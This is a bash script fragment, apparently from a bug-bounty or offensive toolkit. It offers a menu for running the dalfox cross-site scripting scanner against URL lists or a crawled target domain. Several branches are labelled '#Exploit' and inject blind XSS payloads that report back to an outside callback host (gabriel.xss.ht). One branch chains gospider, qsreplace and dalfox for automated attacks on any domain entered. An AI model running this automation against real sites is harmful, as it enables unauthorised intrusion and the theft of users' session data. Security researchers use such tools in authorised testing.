#xss-----------------------------------------------------------------------------------------





echo	"1. dalfox_gf+kxss (xss.txt)   2. dalfox_paramspider (parameters_paramspider.txt)   3. dalfox_Gospider_single (https://target.com)   4. dalfox_Hidden_GET_JSfiles (JS_xss.txt)"	

mkdir results/xss	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                #Exploit  
                                dalfox file xss.txt -b gabriel.xss.ht -o dalfox_gf+kxss_blind-xss.txt 
                                dalfox file xss.txt -o dalfox_gf+kxss_non-blind-xss.txt
 
                                #move file
                                mv dalfox_gf+kxss_blind-xss.txt dalfox_gf+kxss_non-blind-xss.txt results/xss

		;;

	2)
				#Exploit
				dalfox file parameters_paramspider.txt -b gabriel.xss.ht -o dalfox_parameters_paramspider_blind.txt 
                                dalfox file parameters_paramspider.txt -o dalfox_parameters_paramspider_non-blind.txt
 
                                 #move file
                                 mv dalfox_parameters_paramspider_blind.txt dalfox_parameters_paramspider_non-blind.txt results/xss
		;;
          
	3)
		echo -n "Enter the Domain (https://target.com) : "
		read domain
             	gospider -s "$domain" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o dalfox_Gospider_xss.txt

                                #move file
                                mv dalfox_Gospider_xss.txt results/xss

		;;
	
	4)
		#Exploit  
                                dalfox file xss.txt -b gabriel.xss.ht -o dalfox_JS_blind-xss.txt 
                                dalfox file xss.txt -o dalfox_JS_non-blind-xss.txt
 
                                #move file
                                mv dalfox_JS_blind-xss.txt dalfox_JS_non-blind-xss.txt results/xss
               


		;;
                *)
                        echo "Please give valid choice!!!"
		;;

esac










#xss-----------------------------------------------------------------------------------------
